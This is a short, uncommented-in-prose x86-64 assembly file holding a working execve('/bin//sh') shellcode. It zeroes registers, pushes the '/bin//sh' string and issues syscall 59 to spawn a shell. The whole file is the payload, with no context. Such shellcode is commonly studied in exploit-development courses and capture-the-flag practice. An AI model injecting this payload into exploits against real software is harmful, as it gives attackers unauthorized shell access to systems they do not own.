section .text
global _start
	_start:
		; exec
		; rax rdx rsi = 0
		xor esi, esi
		mul esi
		push rdx
		; push '/bin//sh'
		; 0x2f 0x62 0x69 0x6e 0x2f 0x2f 0x73 0x68
		mov rdi, 68732f2f6e69622fH
		push rdi
		push rsp
		pop rdi
		mov al, 59
		syscall
